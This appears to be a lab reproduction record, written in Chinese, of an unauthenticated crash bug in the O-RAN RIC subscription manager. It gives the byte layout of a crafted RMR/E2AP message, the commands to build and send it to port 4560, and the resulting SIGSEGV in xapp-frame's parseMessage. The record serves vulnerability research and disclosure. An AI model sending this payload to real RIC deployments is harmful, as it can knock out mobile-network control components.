# SUB-NEW-1 复现记录

## 环境

- WSL2 Ubuntu 24.04
- RIC 全栈容器（ric-plt-submgr:0.10.1、ric_e2term、ric_e2mgr、ric_dbaas、ric_appmgr、ric_rtmgr_sim、python_xapp_runner）
- submgr 容器地址 `10.0.2.13`，RMR 端口 `4560`，REST 端口 `8088`
- 攻击端为宿主或同网段任意主机（示例用 `10.0.2.1`）

## 攻击载荷结构（350 字节）

```
[50 字节 TP 传输层前缀]
  buf[0:4]  = 总长度（主机字节序）
  buf[4:8]  = 总长度（网络字节序）
  buf[8]    = 0x24 ('$'，TP_SZ_MARKER，标识新格式)

[276 字节 uta_mhdr_t RMR 头]
  mtype     = 12023              (RIC_SUB_DEL_REQUIRED)
  plen      = 24                 (E2AP 载荷长度)
  rmr_ver   = 3
  sid       = "gnb_0115_100_00025b"
  src       = "10.0.2.1:4560"
  meid      = "gnb_0115_100_00025b"
  len0      = 276
  sub_id    = -1

[24 字节 E2AP 载荷（asn1c 编码的 RIC Subscription Delete Required）]
  00 0c 00 14 00 00 01 00 3c 00 0d 01 00 3d 00 08 00 00 7b 00 07 00 02 56
  requestor=123, instance=2, functionId=2, cause=misc/unspecified
```

## 复现命令

```bash
# 1. 编译注入器
cd /root/oran-lab/experiments/submgr-e2node/rmr-inject
export GOROOT=/tmp/goroot124
export PATH=/tmp/goroot124/bin:/usr/bin:/bin
export GOTOOLCHAIN=local
go build -o rmr_inject ./cmd

# 2. 记录攻击前状态
docker ps --format '{{.Names}}\t{{.Status}}' | grep submgr
curl -s http://10.0.2.13:8088/ric/v1/subscriptions

# 3. 注入
./rmr_inject 10.0.2.13:4560

# 4. 观察崩溃（约 1-2 秒内）
docker ps -a --format '{{.Names}}: {{.Status}}' | grep submgr
# 预期输出: ric_submgr: Exited (2)

# 5. 查看崩溃日志
docker logs ric_submgr 2>&1 | grep -aE "SIGSEGV|sigpanic|rmr.go:305"
```

## 实测结果

**注入端输出**：
```
[inject] hdr=276 payload=24 total=300
[inject] sent 300 bytes to 10.0.2.13:4560
[inject] no response in 3s
```

**submgr 崩溃日志**（原始行见 `evidence/crash2_sigsegv.json`）：
```
unexpected fault address 0x7f59ac000c41
fatal error: fault
[signal SIGSEGV: segmentation violation code=0x1 addr=0x7f59ac000c41 pc=0xa3e886]
goroutine 45 [running]:
runtime.throw(...)
    /opt/go/1.18.5/src/runtime/panic.go:992
runtime.sigpanic()
    /opt/go/1.18.5/src/runtime/signal_unix.go:825
gerrit.o-ran-sc.org/r/ric-plt/xapp-frame/pkg/xapp.(*RMRClient).parseMessage(0xc000767180, 0x7d7f3c000d00)
    /root/go/pkg/mod/gerrit.o-ran-sc.org/r/ric-plt/xapp-frame.git@v0.9.16/pkg/xapp/rmr.go:305
gerrit.o-ran-sc.org/r/ric-plt/xapp-frame/pkg/xapp.(*RMRClient).Start.func2()
    /root/go/pkg/mod/gerrit.o-ran-sc.org/r/ric-plt/xapp-frame.git@v0.9.16/pkg/xapp/rmr.go:247
```

**容器状态**：`ric_submgr Exited (2)`，退出码 2。

**两次独立复现**（submgr 重启后再次注入）：
| 次数 | UTC 时间 | 崩溃地址 | 崩溃 PC |
|---|---|---|---|
| 1 | 2026-11-19T07:11:13 | 0x7d803c003241 | 0xa3e886 |
| 2 | 2026-11-19T11:12:50 | 0x7f59ac000c41 | **0xa3e886** |

崩溃 PC 完全一致 → 同一代码位置的确定性崩溃。

## 关键观察

1. **发生在 not-ready 阶段也能触发**：第二次注入时 submgr 尚处于 "Application is not ready yet" 循环，
   说明 RMR 接收线程独立于应用初始化即已开始处理消息——攻击面比预想更早暴露。
2. **崩溃在框架层**：`RMRClient.parseMessage`（xapp-frame 通用代码）而非 submgr 业务代码，
   意味着**所有使用 xapp-frame v0.9.16 的 RIC 组件**（xApp、其他 xApp-frame 服务）都可能受影响。
3. **无需认证**：RMR 端口 4560 接受任意来源 TCP 连接，无 mTLS、无令牌、无源 IP 白名单。

## 未完成部分（如实说明）

本次注入的消息**并未走到** `handleE2TSubscriptionDeleteRequired()` 业务逻辑（崩溃发生在解析阶段）。
因此：

- 「跨节点删除订阅」（C1 / RIC-1079 的核心场景）**尚未在真实组件上完成端到端验证**；
- 该场景目前仅有 L1 级证据（`submgr_sim` 逻辑复现 + 原函数级单元测试）与规范依据（E2AP §8.2.2A、§9.2.7–9.2.8）；
- 要完成 L3 验证，需先修正 RMR 消息格式使其通过 `parseMessage`，本次未达成。

## 证据文件

| 文件 | 内容 |
|---|---|
| `both_sigsegs.json` | 两次 SIGSEGV 的原始日志行（含 pc 地址对比） |
| `crash2_sigsegv.json` | 第二次崩溃完整 goroutine 堆栈（31KB） |
| `crash2_before.json` | 第二次崩溃前的最后日志 |
| `crash_fault_line.json` / `crash_segv_line.json` / `crash_parsemsg_line.json` | 单行关键证据 |
| `injected_12023.json` | 历史上正常 12023 消息的格式参考（来自 2026-11-06） |
| `asn1c_del_payload.bin` | 24 字节 E2AP 载荷原始字节 |
| `submgr_crash_tail.log` | 崩溃前后 300 行日志 |
